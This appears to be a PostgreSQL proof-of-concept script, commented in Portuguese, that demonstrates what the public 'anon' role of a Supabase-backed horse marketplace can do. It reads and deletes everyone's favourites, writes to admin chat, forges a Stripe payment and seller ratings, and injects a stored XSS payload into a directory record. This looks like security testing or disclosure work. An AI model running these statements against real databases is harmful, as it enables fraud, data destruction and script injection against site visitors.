-- Prova, do lado de dentro do PostgreSQL, do que o papel `anon` consegue fazer.
-- `anon` é o papel que a chave NEXT_PUBLIC_SUPABASE_ANON_KEY dá a quem a copia
-- do JavaScript do site — ou seja, a toda a gente.

\echo ''
\echo '========== O QUE `anon` CONSEGUE FAZER =========='
\echo ''

SET ROLE anon;

\echo '--- favoritos: ler e apagar os favoritos de toda a gente ---'
SELECT count(*) AS linhas_visiveis FROM favoritos;
INSERT INTO favoritos (user_email, item_id, item_type)
  VALUES ('vitima@exemplo.pt', gen_random_uuid(), 'cavalo');
SELECT user_email AS email_de_outra_pessoa FROM favoritos;
DELETE FROM favoritos;
SELECT count(*) AS depois_do_delete FROM favoritos;

\echo '--- admin_chat_messages: ler e escrever na conversa interna da administracao ---'
INSERT INTO admin_chat_messages (sender_email, message) VALUES ('admin@portal-lusitano.pt', 'segredo');
SELECT sender_email, message FROM admin_chat_messages;

\echo '--- payments: inserir um pagamento forjado ---'
INSERT INTO payments (stripe_session_id, email, amount, currency, status)
  VALUES ('cs_test_da_vitima', 'atacante@exemplo.pt', 1, 'eur', 'succeeded');
SELECT stripe_session_id, email, amount FROM payments;

\echo '--- contact_submissions: reescrever o formulario de um anuncio ja pago ---'
RESET ROLE;
INSERT INTO contact_submissions (email, form_data) VALUES ('vendedor@exemplo.pt', '{"nomeCavalo":"Fidalgo"}');
SET ROLE anon;
UPDATE contact_submissions SET form_data = '{"nomeCavalo":"REESCRITO PELO ATACANTE"}';
SELECT form_data->>'nomeCavalo' AS nome_do_cavalo FROM contact_submissions;

\echo '--- coudelarias: reescrever uma ficha do directorio (e o JSON-LD dela) ---'
RESET ROLE;
INSERT INTO coudelarias (slug, nome, status) VALUES ('quinta-real', 'Quinta Real', 'active');
SET ROLE anon;
UPDATE coudelarias SET nome = '</script><script>alert(1)</script>';
SELECT nome FROM coudelarias;

\echo '--- seller_ratings: forjar avaliacoes em nome de outro comprador ---'
INSERT INTO seller_ratings (cavalo_id, buyer_email, rating, comment)
  VALUES (gen_random_uuid(), 'comprador.real@exemplo.pt', 1, 'forjado');
SELECT buyer_email, rating FROM seller_ratings;

\echo '--- admin_tasks: ler e escrever as tarefas do painel de administracao ---'
INSERT INTO admin_tasks (titulo) VALUES ('tarefa injectada');
SELECT titulo FROM admin_tasks;

RESET ROLE;
